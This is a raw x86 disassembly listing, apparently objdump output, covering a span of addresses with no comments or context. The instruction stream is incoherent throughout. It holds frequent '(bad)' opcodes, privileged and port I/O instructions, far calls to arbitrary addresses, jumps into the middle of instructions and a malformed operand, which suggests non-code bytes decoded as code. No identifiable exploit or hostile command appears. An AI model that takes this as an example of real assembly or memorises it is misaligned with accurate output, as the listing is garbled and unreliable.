  41ff55:	pop    edi
  41ff56:	xchg   ebp,eax
  41ff58:	pop    ecx
  41ff59:	test   DWORD PTR [ecx-0x4db98ac1],esp
  41ff5f:	fld    TBYTE PTR [eax+0x39]
  41ff62:	test   al,0x4b
  41ff64:	jnp    0x41ffd7
  41ff66:	mov    ebx,0xa72f7494
  41ff6b:	shl    BYTE PTR [ebx+0x43],cl
  41ff6e:	sub    edx,DWORD PTR [ebp+0x53]
  41ff71:	pop    edx
  41ff72:	mov    bh,0xfa
  41ff74:	adc    BYTE PTR [ecx],cl
  41ff76:	mov    ebx,0xc9ce824
  41ff7b:	xchg   BYTE PTR [eax-0x71],dl
  41ff7e:	adc    BYTE PTR [esi-0x42],bl
  41ff81:	mov    esi,0x29d3279b
  41ff86:	inc    esi
  41ff87:	adc    BYTE PTR [edx+0x14],ch
  41ff8a:	loope  0x41ffdb
  41ff8c:	mov    ds,WORD PTR [edi]
  41ff8e:	in     al,0x41
  41ff90:	dec    ebp
  41ff91:	or     al,0x73
  41ff93:	popf   
  41ff94:	js     0x41ffa3
  41ff96:	jbe    0x41ffc0
  41ff98:	retf   
  41ff99:	pushf  
  41ff9a:	loopne 0x41ff6f
  41ff9c:	dec    edi
  41ff9d:	pop    esi
  41ff9e:	mov    esi,0xf248d54b
  41ffa3:	inc    esp
  41ffa4:	adc    al,0x65
  41ffa6:	js     0x41ffed
  41ffa8:	and    BYTE PTR [edi],dl
  41ffaa:	pushf  
  41ffab:	mov    ebp,DWORD PTR [eax-0x6e81e59]
  41ffb1:	mov    edx,0x2fe59946
  41ffb6:	push   cs
  41ffb7:	out    0xb2,eax
  41ffb9:	jae    0x420021
  41ffbb:	retf   
  41ffbc:	popf   
  41ffbd:	scas   al,BYTE PTR es:[edi]
  41ffbe:	push   0xffffff8d
  41ffc0:	add    ebx,DWORD PTR [ebp-0x59367956]
  41ffc6:	imul   esp,DWORD PTR [ecx],0x40
  41ffc9:	or     cl,0xbc
  41ffcc:	aam    0x27
  41ffce:	or     eax,0x1131e893
  41ffd3:	push   eax
  41ffd4:	sti    
  41ffd5:	das    
  41ffd6:	mov    DWORD PTR [edx+0x3401eaa0],esi
  41ffdc:	imul   eax,DWORD PTR cs:[ebp-0x6366ee2],0xffffff9d
  41ffe4:	neg    DWORD PTR [esi+0x4e5ca9f3]
  41ffea:	inc    edx
  41ffeb:	mov    edi,0x53580a9d
  41fff0:	sbb    eax,0x869c8b4
  41fff5:	pop    es
  41fff6:	inc    edi
  41fff7:	outs   dx,BYTE PTR ds:[esi]
  41fff8:	cli    
  41fff9:	addr16 cmp ah,bh
  41fffc:	(bad)  
  41fffe:	xor    BYTE PTR [eax],dh
  420000:	push   ebp
  420001:	pop    edi
  420002:	pop    ecx
  420003:	push   0x6eee32f
  420008:	retf   0x4b63
  42000b:	(bad)  
  42000c:	in     al,dx
  42000d:	jbe    0x42002a
  42000f:	mov    bl,0xb2
  420011:	push   edi
  420012:	jnp    0x41ffee
  420014:	jge    0x42003f
  420016:	xor    dl,dl
  420018:	hlt    
  420019:	int    0xc0
  42001b:	mov    ebx,?
  42001d:	mov    edi,0x658f244b
  420022:	mov    al,ds:0x6f642cb4
  420027:	les    ebp,FWORD PTR [edx]
  420029:	and    al,0x9d
  42002b:	cwde   
  42002c:	cld    
  42002d:	dec    esi
  42002e:	mov    ch,BYTE PTR [esi+ebp*2+0x4245845b]
  420035:	xchg   edx,eax
  420036:	adc    BYTE PTR [ecx+eax*8],ah
  420039:	dec    esp
  42003a:	jns    0x42008b
  42003c:	retf   0xf86a
  42003f:	test   eax,0x7e9eb88d
  420044:	mov    ch,0xb
  420046:	icebp  
  420047:	sti    
  420048:	adc    eax,0x2fdb5b90
  42004d:	inc    ecx
  42004e:	inc    edi
  42004f:	fstp   TBYTE PTR [ecx]
  420051:	lock lock scas eax,DWORD PTR es:[edi]
  420054:	int3   
  420055:	adc    ebp,DWORD PTR [eax+ebp*2]
  420058:	xchg   edx,eax
  420059:	and    edi,esi
  42005b:	pop    edi
  42005c:	mov    dl,0xba
  42005e:	sub    eax,0x6a53f36b
  420063:	push   ecx
  420064:	into   
  420065:	fidiv  DWORD PTR [eax-0x4]
  420068:	stos   DWORD PTR es:[edi],eax
  420069:	fwait
  42006a:	mov    ebp,0x23dd90f9
  42006f:	push   eax
  420070:	cli    
  420071:	cmp    esp,DWORD PTR [ebx]
  420073:	fimul  WORD PTR [ebx]
  420075:	mov    eax,0xe742e068
  42007a:	cwde   
  42007b:	mov    ch,0x54
  42007d:	mov    eax,0x3830ef57
  420082:	out    dx,eax
  420083:	mov    eax,0x6e489d35
  420088:	loop   0x4200d6
  42008a:	cld    
  42008b:	pop    ebp
  42008c:	inc    eax
  42008d:	icebp  
  42008e:	pusha  
  42008f:	mov    cs,WORD PTR [ecx+0x136332c2]
  420095:	and    edx,edi
  420097:	mov    ebx,0x67eb0f6d
  42009c:	xchg   BYTE PTR [eax-0x14],dh
  42009f:	dec    edx
  4200a0:	adc    ch,bh
  4200a2:	dec    edi
  4200a3:	mov    dh,0xb9
  4200a5:	xor    eax,0x6c19618a
  4200aa:	inc    edx
  4200ab:	sub    bh,dh
  4200ad:	cmc    
  4200ae:	(bad)  
  4200af:	inc    eax
  4200b0:	sbb    ebx,DWORD PTR ds:0x930c123f
  4200b6:	adc    dh,BYTE PTR [esi-0x6a]
  4200b9:	mov    edx,0x578af6c4
  4200be:	loopne 0x4200c3
  4200c0:	add    al,0xab
  4200c2:	jle    0x42011c
  4200c4:	and    al,0x33
  4200c6:	sar    DWORD PTR [ecx-0x48],0x87
  4200ca:	scas   al,BYTE PTR es:[edi]
  4200cb:	sub    ebp,DWORD PTR [ebp-0x16]
  4200ce:	das    
  4200cf:	pop    ss
  4200d0:	ret    0x3384
  4200d3:	rcr    ecx,0x4e
  4200d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200d7:	push   ebp
  4200d8:	push   ds
  4200d9:	lock jnp 0x420110
  4200dc:	adc    al,0xb9
  4200de:	into   
  4200df:	fwait
  4200e0:	mov    esp,0x4413822
  4200e5:	sub    edx,DWORD PTR [ecx]
  4200e7:	xchg   DWORD PTR [edx-0x6376f491],eax
  4200ed:	mov    bl,BYTE PTR [esi]
  4200ef:	cmp    eax,ebx
  4200f1:	dec    edi
  4200f2:	adc    BYTE PTR ds:0xdac84625,ah
  4200f8:	fnstcw WORD PTR [ebp+0x506c7dbb]
  4200fe:	clc    
  4200ff:	pop    esp
  420100:	jb     0x42009a
  420102:	std    
  420103:	fcmove st,st(3)
  420105:	js     0x420101
  420107:	(bad)  
  420108:	mov    edi,0xf2e5f904
  42010d:	sbb    eax,0xd3b7adc
  420112:	lods   al,BYTE PTR ds:[esi]
  420113:	mov    ecx,0x8ac3572a
  420118:	cmp    DWORD PTR [edx],ebp
  42011a:	xor    esp,DWORD PTR [ecx-0x1c]
  42011d:	inc    edx
  42011e:	mov    al,ds:0xeae6300
  420123:	(bad)
  420126:	mov    ebp,0x4efb81a9
  42012b:	mov    al,0x38
  42012d:	stos   BYTE PTR es:[edi],al
  42012e:	push   esp
  42012f:	mov    ch,0x6
  420131:	fdivr  st(2),st
  420133:	pop    es
  420134:	ss inc ecx
  420136:	inc    edi
  420137:	repnz xchg ecx,eax
  420139:	cmp    eax,0xd1fbd4f6
  42013e:	(bad)  [edi+eiz*1-0x24]
  420142:	sbb    al,0x17
  420144:	xor    BYTE PTR ds:0x9279c331,bl
  42014a:	mov    eax,ds:0xf26da3c9
  42014f:	xchg   bh,cl
  420151:	jns    0x4200d6
  420153:	xor    eax,0xdde32cb
  420158:	lock fild WORD PTR [edx-0x4e]
  42015c:	jmp    0xd5934876
  420161:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420162:	outs   dx,BYTE PTR ds:[esi]
  420163:	dec    edi
  420164:	push   ecx
  420165:	loop   0x420185
  420167:	pop    ss
  420168:	iret   
  420169:	push   ds
  42016a:	pop    eax
  42016b:	mov    bp,0xb41
  42016f:	iret   
  420170:	mov    eax,ds:0x8c90177a
  420175:	mov    ch,0xf5
  420177:	call   0x1610cdce
  42017c:	adc    eax,0x6ca18b49
  420181:	sbb    eax,0x8a59
	...
  42018e:	add    BYTE PTR [eax],al
  420190:	add    BYTE PTR [edx+ecx*1-0x6060f363],dl
  420197:	xchg   ebp,eax
  420198:	call   0xd922:0x7836e732
  42019f:	ret    0xc31b
  4201a2:	jnp    0x4201a5
  4201a4:	add    BYTE PTR [ebx-0x6fffffd],ch
  4201aa:	aad    0x79
  4201ac:	sbb    ecx,DWORD PTR [ebp-0x6e]
  4201af:	mov    DWORD PTR [eax-0x68],0xa4e70dc1
  4201b6:	leave  
  4201b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201b8:	icebp  
  4201b9:	mov    ebp,DWORD PTR [esi-0x3e24ddbf]
  4201bf:	xlat   BYTE PTR ds:[ebx]
  4201c0:	les    ecx,FWORD PTR [ecx]
  4201c2:	pop    esi
  4201c3:	or     al,BYTE PTR [edi-0x68]
  4201c6:	inc    esp
  4201c7:	xor    eax,0xd0cdd893
  4201cc:	ins    DWORD PTR es:[edi],dx
  4201cd:	xchg   ebp,eax
  4201ce:	pop    ecx
  4201cf:	sub    BYTE PTR [ebx],0x38
  4201d2:	scas   eax,DWORD PTR es:[edi]
  4201d3:	popa   
  4201d4:	or     BYTE PTR ds:[ebp-0x75],al
  4201d8:	and    eax,0x23278b51
  4201dd:	das    
  4201de:	cdq    
  4201df:	ficom  WORD PTR ds:0x40178b1a
  4201e5:	xchg   ebx,eax
  4201e6:	std    
  4201e7:	inc    eax
  4201e8:	push   esi
  4201e9:	add    cl,dl
  4201eb:	(bad)  
  4201ec:	pop    esi
  4201ed:	int3   
  4201ee:	mov    ds:0x63468b2a,eax
  4201f3:	sub    eax,0xab0ab956
  4201f8:	dec    esi
  4201f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201fa:	sbb    DWORD PTR [edx-0x2c0a1c7f],0xe
  420201:	(bad)  
  420202:	arpl   WORD PTR [edx],di
  420204:	dec    esp
  420205:	jge    0x4201a8
  420207:	int3   
  420208:	mov    dl,0x2d
  42020a:	daa    
  42020b:	in     eax,dx
  42020c:	lods   al,BYTE PTR ds:[esi]
  42020d:	out    dx,eax
  42020e:	cmp    bl,dl
  420210:	mov    ds:0xb71e45e0,eax
  420215:	les    esp,FWORD PTR [ebx+0x5e7e1eae]
  42021b:	xor    al,0x66
  42021d:	sub    esi,ecx
  42021f:	fisttp QWORD PTR [eax+0x77]
  420222:	push   ebp
  420223:	sbb    edi,DWORD PTR [ecx+0x6a]
  420226:	xchg   esi,eax
  420227:	std    
  420228:	sahf   
  420229:	sbb    BYTE PTR ds:0xa52022e3,bh
  42022f:	jb     0x420253
  420231:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420232:	rcl    DWORD PTR [ebx-0x16],1
  420235:	rcl    BYTE PTR [eax-0x7733f5a6],cl
  42023b:	not    DWORD PTR [edi+0x50]
  42023e:	or     edi,ebx
  420240:	dec    esi
  420241:	test   ebx,edx
  420243:	mov    dh,0xe6
  420245:	xchg   esp,eax
  420246:	push   ss
  420247:	ja     0x42024a
  420249:	pop    esi
  42024a:	lea    esp,[ecx]
  42024c:	aad    0x93
  42024e:	mov    eax,0xd9c021e3
  420253:	push   ecx
  420254:	push   edi
  420255:	push   ebp
  420256:	mov    cl,BYTE PTR [edi+0x5b39f31f]
  42025c:	repz ror BYTE PTR [ebp-0x3b3fa922],cl
  420263:	pop    ebx
  420264:	mov    edx,DWORD PTR [esi+0x7c41e77]
  42026a:	into   
  42026b:	mov    ebx,0xbd352815
  420270:	lds    esi,FWORD PTR [ebx-0x5529cf30]
  420276:	lock inc esp
  420278:	sbb    al,BYTE PTR [ecx-0x1cd56664]
  42027e:	pop    ecx
  42027f:	add    eax,0xa503e357
  420284:	xlat   BYTE PTR gs:[ebx]
  420286:	jg     0x4202e6
  420288:	iret   
  420289:	inc    edi
  42028a:	xchg   esp,eax
  42028b:	ret    0x3f65
  42028e:	out    0xb4,eax
  420290:	inc    edi
  420291:	lea    ebp,[ebx]
  420293:	lds    ebx,FWORD PTR [edi+0x6a]
  420296:	gs loope 0x420251
  420299:	sub    al,0x50
  42029b:	js     0x42021e
  42029d:	leave  
  42029e:	push   ecx
  42029f:	call   0xdefb:0x9e981de8
  4202a6:	mov    BYTE PTR [edx*4-0x361b0c65],bl
  4202ad:	add    edi,esp
  4202af:	lods   eax,DWORD PTR ds:[esi]
  4202b0:	fimul  DWORD PTR [eax-0x7822b0be]
  4202b6:	adc    eax,0x4c0454ab
  4202bb:	gs jno 0x42027b
  4202be:	mov    ch,BYTE PTR [eax+0x4b]
  4202c1:	adc    BYTE PTR [ebx],0x61
  4202c4:	push   ebp
  4202c5:	mov    edx,fs
  4202c7:	dec    esp
  4202c8:	popf   
  4202c9:	aas    
  4202ca:	lods   eax,DWORD PTR ds:[esi]
  4202cb:	mov    ebx,0x515da479
  4202d0:	cmp    eax,0x863fe9ba
  4202d5:	push   eax
  4202d6:	in     al,dx
  4202d7:	jne    0x4202e8
  4202d9:	adc    DWORD PTR [edx+0x34],edx
  4202dc:	sar    BYTE PTR [edx],0x7d
  4202df:	push   0xa5b9f508
  4202e4:	mov    al,BYTE PTR [eax+0x4d]
  4202e7:	xor    bl,BYTE PTR [edi-0x12]
  4202ea:	push   esp
  4202eb:	or     eax,0x3bdcdf2b
  4202f0:	and    al,BYTE PTR [ebx+0x580a7e60]
  4202f6:	inc    BYTE PTR [edx]
  4202f8:	mov    eax,DWORD PTR [esi]
  4202fa:	retf   0x23cc
  4202fd:	dec    edi
  4202fe:	cmp    BYTE PTR [esi],0xd5
  420301:	add    eax,DWORD PTR [edi]
  420303:	not    dl
  420305:	add    eax,0x3eb6f5e8
  42030a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42030b:	push   edi
  42030c:	push   esi
  42030d:	ror    DWORD PTR [ecx+0x5488808c],1
  420313:	pop    ebp
  420314:	inc    ebx
  420315:	sbb    ecx,DWORD PTR [ecx-0x7c]
  420318:	add    al,0x31
  42031a:	or     eax,0x349519ba
  42031f:	cmp    eax,0x102f3e56
  420324:	and    eax,0x33381d6b
  420329:	jecxz  0x42031d
  42032b:	cdq    
  42032c:	cdq    
  42032d:	add    ebx,DWORD PTR [ebx]
  42032f:	fnstenv [ebx-0x34]
  420332:	fmulp  st(6),st
  420334:	bound  esp,QWORD PTR [esi-0x55]
  420337:	(bad)  
  420338:	lods   al,BYTE PTR ds:[esi]
  420339:	add    DWORD PTR [eax+0x3011d990],0xe3a1afe4
  420343:	retf   
  420344:	retf   
  420345:	aam    0x40
  420347:	in     eax,0xe3
  420349:	imul   ebx,DWORD PTR [edi-0xc],0x2b529a33
  420350:	mov    dl,0x60
  420352:	and    cl,BYTE PTR [ebp-0x52]
  420355:	dec    ebp
  420356:	adc    eax,0x78
  420359:	inc    ebx
  42035a:	scas   al,BYTE PTR es:[edi]
  42035b:	rol    BYTE PTR [ebx-0x50],cl
  42035e:	in     eax,0x8c
  420360:	mov    eax,DWORD PTR [eax+0x244defbf]
  420366:	xor    DWORD PTR [edx+0x537f7733],eax
  42036c:	xor    cl,ch
  42036e:	push   eax
  42036f:	add    BYTE PTR [edi],0xac
  420372:	xor    dl,BYTE PTR [esi-0x615a3b2f]
  420378:	fst    st(1)
  42037a:	scas   al,BYTE PTR es:[edi]
  42037b:	dec    ebp
  42037c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42037d:	add    esi,DWORD PTR [edx+0x59]
  420380:	out    dx,eax
  420381:	stc    
  420382:	neg    DWORD PTR [edi]
  420384:	inc    ebx
  420385:	mov    eax,ds:0x7212e767
  42038a:	push   esp
  42038b:	inc    ecx
  42038c:	arpl   WORD PTR [eax+ecx*4+0x16],cx
  420390:	or     eax,0xf67bd357
  420395:	xchg   ebp,eax
  420396:	(bad)  
  420398:	cmp    edx,esp
  42039a:	jecxz  0x420332
  42039c:	in     eax,0x8f
  42039e:	mov    edx,0x80104316
  4203a3:	sbb    DWORD PTR [edi+eiz*8],ebx
  4203a6:	push   cs
  4203a7:	sar    DWORD PTR [ecx],1
  4203a9:	out    dx,eax
  4203aa:	ja     0x420353
  4203ac:	xchg   edi,eax
  4203ad:	xchg   DWORD PTR [ecx+0x48],ebp
  4203b0:	aam    0x3c
  4203b2:	enter  0x6885,0x63
  4203b6:	sbb    DWORD PTR [ebp+edx*4+0x3],ecx
  4203ba:	jo     0x420391
  4203bc:	pop    edi
  4203bd:	mov    eax,0x66576005
  4203c2:	push   edi
  4203c3:	into   
  4203c4:	pop    ecx
  4203c5:	(bad)  
  4203c6:	xor    bh,BYTE PTR [edx+0x47]
  4203c9:	imul   esi,DWORD PTR [ecx+0x49120853],0xffffffb9
  4203d0:	mov    edi,0xd42e3d83
  4203d5:	mov    al,0x9c
  4203d7:	push   eax
  4203d8:	and    DWORD PTR [edi+0x0],eax
  4203db:	adc    esp,DWORD PTR [ecx-0x32]
  4203de:	mov    dl,0x9e
  4203e0:	cdq    
  4203e1:	lea    eax,[esi]
  4203e3:	adc    eax,0x8522e344
  4203e8:	jo     0x420398
  4203ea:	jge    0x4203d9
  4203ec:	pop    ds
  4203ed:	fmul   QWORD PTR [edx-0x3b11f0fd]
  4203f3:	sahf   
  4203f4:	retf   0x2275
  4203f7:	cmp    al,0x92
  4203f9:	sbb    eax,0x73b018b4
  4203fe:	adc    BYTE PTR [esi+ebx*4],ah
  420401:	fst    QWORD PTR [ebp+0xd]
  420404:	adc    eax,0x260444fd
  420409:	out    0x91,al
  42040b:	test   DWORD PTR [eax+0x298b86d6],ebp
  420411:	jge    0x4203e5
  420413:	cmp    ebp,DWORD PTR ds:0x6626418a
  420419:	cdq    
  42041a:	into   
  42041b:	push   ss
  42041c:	popa   
  42041d:	push   ebx
  42041e:	jbe    0x4203fb
  420420:	call   0x5137cfc3
  420425:	in     al,0xa7
  420427:	clc    
  420428:	mov    edi,0xa4cd421d
  42042d:	shl    bh,1
  42042f:	int    0xf2
  420431:	fwait
  420432:	sbb    BYTE PTR [ecx+0x67],al
  420435:	mov    al,0x3b
  420437:	jg     0x4203be
  420439:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42043a:	fisub  DWORD PTR [ecx]
  42043c:	xor    ecx,DWORD PTR ds:0x9155b4ed
  420442:	or     al,0x4d
  420444:	jnp    0x4203e6
  420446:	xchg   edx,eax
  420447:	jno    0x420416
  420449:	or     eax,0xdd75d1ea
  42044e:	bound  ebx,QWORD PTR [ecx-0x65]
  420451:	dec    edx
  420452:	jp     0x4204cc
  420454:	sub    al,0xd8
  420456:	or     dh,dl
  420458:	ins    DWORD PTR es:[edi],dx
  420459:	loopne 0x420425
  42045b:	scas   al,BYTE PTR es:[edi]
  42045c:	cmp    al,0xe4
  42045e:	add    cl,dl
  420460:	test   BYTE PTR [ebx-0xff86756],0xd2
  420467:	push   ebp
  420468:	sub    DWORD PTR [ecx+0x641c8150],0xa
  42046f:	es loopne 0x420498
  420472:	sbb    eax,0x1dc48d65
  420477:	pop    ecx
  420478:	sub    dh,ch
  42047a:	cmp    bh,BYTE PTR [ebx+0x1a]
  42047d:	hlt    
  42047e:	xchg   edx,ebx
  420480:	out    0xad,eax
  420482:	sub    al,0x96
  420484:	jne    0x420441
  420486:	cmc    
  420487:	lods   al,BYTE PTR ds:[esi]
  420488:	loopne 0x42048c
  42048a:	mov    ds:0x94ca1a0b,al
  42048f:	aam    0xba
  420491:	inc    ecx
  420492:	xor    edi,DWORD PTR ds:0x753664a2
  420498:	into   
  420499:	or     BYTE PTR [ebp+0x42],bh
  42049c:	aaa    
  42049d:	imul   esi,DWORD PTR [eax],0xd94d9b2e
  4204a3:	mov    BYTE PTR [edi],cl
  4204a5:	jne    0x420463
  4204a7:	(bad)  
  4204a8:	pop    esi
  4204a9:	mov    edi,0xde56abde
  4204ae:	aam    0x1
  4204b0:	ret    
  4204b1:	jecxz  0x4204e5
  4204b3:	sar    DWORD PTR ds:0x42a9789d,1
  4204b9:	add    BYTE PTR [esi],bl
  4204bb:	dec    ebx
  4204bc:	dec    edi
  4204bd:	sar    BYTE PTR [eax+0xe],cl
  4204c0:	sub    eax,0x9fdcf411
  4204c5:	xor    DWORD PTR [ecx],0xffffffbe
  4204c8:	aas    
  4204c9:	call   0x1544:0xcdf7b348
  4204d0:	mov    ecx,0xf95ddc20
  4204d5:	xchg   esi,eax
  4204d6:	(bad)  [eax-0x58bfa1b2]
  4204dc:	scas   eax,DWORD PTR es:[edi]
  4204dd:	cwde   
  4204de:	sbb    al,0x96
  4204e0:	ins    BYTE PTR es:[edi],dx
  4204e1:	jp     0x420489
  4204e3:	je     0x420471
  4204e5:	hlt    
  4204e6:	and    bh,BYTE PTR [ecx-0x1682554d]
  4204ec:	or     bl,BYTE PTR ds:0x56a88b22
  4204f2:	bnd jae 0x4204ea
  4204f5:	ret    
  4204f6:	push   edi
  4204f7:	mov    BYTE PTR [edx],bl
  4204f9:	stc    
  4204fa:	test   eax,0xe3b00325
  4204ff:	dec    eax
  420500:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420501:	jecxz  0x420551
  420503:	cwde   
  420504:	jnp    0x42057f
  420506:	jno    0x4204a0
  420508:	mov    edi,0xcd340df7
  42050d:	mov    bh,0x6e
  42050f:	sub    bh,dh
  420511:	jle    0x420546
  420513:	mov    al,0x5c
  420515:	sub    eax,0xd7f199f5
  42051a:	dec    ebp
  42051b:	mov    ecx,0x3a6de12c
  420520:	jmp    0x4204d7
  420522:	xor    BYTE PTR [edi+0x7ee041ad],0xe9
  420529:	xchg   esp,eax
  42052a:	sub    edi,eax
  42052c:	push   ecx
  42052d:	mov    ah,0x50
  42052f:	inc    esi
  420530:	mov    esp,0x3e3b6b7
  420535:	jl     0x4204ce
  420537:	push   ecx
  420538:	sbb    eax,DWORD PTR [ebx-0x6a]
  42053b:	or     ch,BYTE PTR [eax]
  42053d:	push   cs
  42053e:	out    0x5e,eax
  420540:	sbb    al,0xc1
  420542:	push   ds
  420543:	mov    al,0xcd
  420545:	xchg   ebx,eax
  420546:	es loopne 0x4204ea
  420549:	stc    
  42054a:	mov    BYTE PTR [esi-0x1a],dh
  42054d:	test   ah,dl
  42054f:	sbb    dh,ah
  420551:	imul   edx,DWORD PTR [esi+0x76],0x0
	...
  420561:	nop
  420562:	mov    bl,0x8c
  420564:	fild   QWORD PTR [edi-0x1b002c01]
  42056a:	and    dh,0xd4
  42056d:	adc    eax,0x6e14e819
  420572:	jg     0x420575
  420574:	add    BYTE PTR [ebx+0x6e000003],ch
  42057a:	pop    ebp
  42057b:	pop    ecx
  42057c:	stos   DWORD PTR es:[edi],eax
  42057d:	dec    eax
  42057e:	push   ss
  42057f:	dec    ebp
  420580:	out    0xd7,eax
  420582:	popa   
  420583:	lods   eax,DWORD PTR ds:[esi]
  420584:	adc    eax,0xf277e1c9
  420589:	mov    al,0x42
  42058b:	push   ebx
  42058c:	arpl   WORD PTR [edi+eax*8-0xe3bb352],sp
  420593:	outs   dx,BYTE PTR ds:[esi]
  420594:	pop    edi
  420595:	shl    DWORD PTR [esi+0x74],cl
  420598:	scas   al,BYTE PTR es:[edi]
  420599:	xchg   BYTE PTR [ebx+0x271537b],bl
  42059f:	xlat   BYTE PTR ds:[ebx]
  4205a0:	xchg   ebp,eax
  4205a1:	push   ds
  4205a2:	lea    eax,[eax]
  4205a4:	inc    eax
  4205a5:	mov    edi,0x611e5598
  4205aa:	cmp    DWORD PTR [ecx],ecx
  4205ac:	xchg   DWORD PTR [ebx+0x6fc7216a],ebx
  4205b2:	in     al,0xb6
  4205b4:	pop    ds
  4205b5:	gs pop esi
  4205b7:	cs ret 
  4205b9:	sbb    BYTE PTR [ecx-0x59d850ef],al
  4205bf:	(bad)  
  4205c0:	mov    ebp,0xb86ef293
  4205c5:	imul   esp,DWORD PTR [ebx+0x60a3fcee],0x483f6b76
  4205cf:	ja     0x420563
  4205d1:	popa   
  4205d2:	inc    esp
  4205d3:	jg     0x420603
  4205d5:	add    al,0x64
  4205d7:	(bad)  
  4205d8:	test   DWORD PTR [ecx+eiz*2+0x63fca8b0],0xd475e31a
  4205e3:	and    eax,DWORD PTR [edi+esi*4+0x9]
  4205e7:	xor    al,0xa7
  4205e9:	int    0xb1
  4205eb:	push   esp
  4205ec:	repnz mov al,ds:0x1d5d5e1e
  4205f2:	pushf  
  4205f3:	pop    edi
  4205f4:	xlat   BYTE PTR ds:[ebx]
  4205f5:	mov    al,al
  4205f7:	jae    0x4205b7
  4205f9:	and    ah,ah
  4205fb:	loopne 0x420613
  4205fd:	jmp    0xd3f1:0x18210ed5
  420604:	dec    esp
  420605:	sub    BYTE PTR [edi],al
  420607:	xchg   edx,eax
  420608:	or     dl,cl
  42060a:	cmp    eax,0x754859f0
  42060f:	and    DWORD PTR [eax],esp
  420611:	aam    0xf9
  420613:	jg     0x4205cc
  420615:	fwait
  420616:	sub    bh,dl
  420618:	fnsave [eax-0x2a]
  42061b:	adc    bl,dh
  42061d:	dec    ebx
  42061e:	push   es
  42061f:	or     al,0xbc
  420621:	xor    al,0xdf
  420623:	pop    esi
  420624:	mov    BYTE PTR [edi],0x59
  420627:	xor    al,0xa2
  420629:	shl    DWORD PTR [esi-0x68],0xdc
  42062d:	add    DWORD PTR [edx+0x68],ecx
  420630:	adc    eax,0x98a5fa0c
  420635:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420636:	retf   
  420637:	add    al,dl
  420639:	and    BYTE PTR [ebx+0x9c6818d],ch
  42063f:	fstp   TBYTE PTR [ebx+eiz*1-0x47]
  420643:	fldcw  WORD PTR [edx-0x3e]
  420646:	jle    0x42066a
  420648:	xchg   edx,eax
  420649:	push   cs
  42064a:	adc    edx,edi
  42064c:	ret    0x11d
  42064f:	(bad)  
  420650:	and    esi,DWORD PTR [eax]
  420652:	sbb    ebx,DWORD PTR [ecx]
  420654:	xchg   ecx,eax
  420655:	push   esi
  420656:	push   edx
  420657:	pop    esi
  420658:	inc    esi
  420659:	cli    
  42065a:	mov    ebp,0x4c02afea
  42065f:	iret   
  420660:	push   edx
  420661:	mov    edx,0xc7a2ff49
  420666:	inc    ebp
  420667:	cmp    BYTE PTR [edi],al
  420669:	push   cs
  42066a:	sahf   
  42066b:	div    DWORD PTR [edi]
  42066d:	pop    eax
  42066e:	dec    eax
  42066f:	xchg   esp,eax
  420670:	dec    ebx
  420671:	dec    ebp
  420672:	or     esp,DWORD PTR [esi+0xef0db00]
  420678:	push   0xffffff91
  42067a:	pop    ebx
  42067b:	add    edx,DWORD PTR ds:0xeef4877d
  420681:	inc    ebx
  420682:	push   cs
  420683:	mov    ch,0x8f
  420685:	jb     0x420609
  420687:	jg     0x42067a
  420689:	out    dx,al
  42068a:	mov    ah,0xba
  42068c:	cmp    al,0x4c
  42068e:	std    
  42068f:	cmp    bh,BYTE PTR [ecx-0x4e17e509]
  420695:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420696:	cmp    dl,BYTE PTR [ebp+ebp*2+0x5d058d2]
  42069d:	(bad)  
  42069e:	aas    
  42069f:	cmp    ebp,0x3036b762
  4206a5:	adc    eax,0xe8db654c
  4206aa:	mov    DWORD PTR [eax],edi
  4206ac:	fst    QWORD PTR [esi+ebp*1+0x49]
  4206b0:	out    0x6e,al
  4206b2:	hlt    
  4206b3:	pop    ds
  4206b4:	jbe    0x42064c
  4206b6:	mov    ebx,0x8dd54a7e
  4206bb:	shl    BYTE PTR [bp+di+0xaa4],0xf1
  4206c1:	cmp    ebp,edx
  4206c3:	jno    0x420704
  4206c5:	adc    al,0xac
  4206c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206c8:	adc    BYTE PTR [eiz*4+0x438107fe],ch
  4206cf:	mov    esi,0xe9c6205f
  4206d4:	dec    ebx
  4206d5:	loope  0x4206f0
  4206d7:	repnz dec esp
  4206d9:	push   edi
  4206da:	sbb    DWORD PTR [ebx],ebx
  4206dc:	or     eax,0xd27916e8
  4206e1:	rcr    bh,1
  4206e3:	push   ebx
  4206e4:	mov    esp,0x7200f416
  4206e9:	add    esi,DWORD PTR [edi]
  4206eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206ed:	or     edx,DWORD PTR [ebp+0x7c]
  4206f0:	repz enterw 0x7d45,0xd0
  4206f6:	dec    esp
  4206f7:	pushf  
  4206f8:	or     eax,0x217760aa
  4206fd:	mov    al,ds:0xc608f913
  420702:	sqrtps xmm3,XMMWORD PTR [esi-0x68d7f647]
  420709:	push   ecx
  42070a:	jmp    0xa151338
  42070f:	jne    0x4206a1
  420711:	in     eax,dx
  420712:	pusha  
  420713:	sub    eax,0x3078730b
  420718:	in     eax,0x6a
  42071a:	cmp    bl,BYTE PTR [ebp+0x7c6989a8]
  420720:	jae    0x420705
  420722:	xchg   ebx,eax
  420723:	mov    edx,0x5a24578c
  420728:	pop    ebp
  420729:	adc    al,0x1b
  42072b:	push   eax
  42072c:	dec    edx
  42072d:	in     eax,dx
  42072e:	hlt    
  42072f:	push   ebx
  420730:	fwait
  420731:	pop    ebp
  420732:	mov    bh,0xe5
  420734:	pop    esi
  420735:	jle    0x420754
  420737:	sahf   
  420738:	cmp    al,0x30
  42073a:	call   0x34bc:0x6cc7722b
  420741:	sub    eax,0x12f38893
  420746:	mov    al,0x35
  420748:	loopne 0x42070b
  42074a:	push   esi
  42074b:	dec    ebp
  42074c:	(bad)  
  42074d:	ds push ds
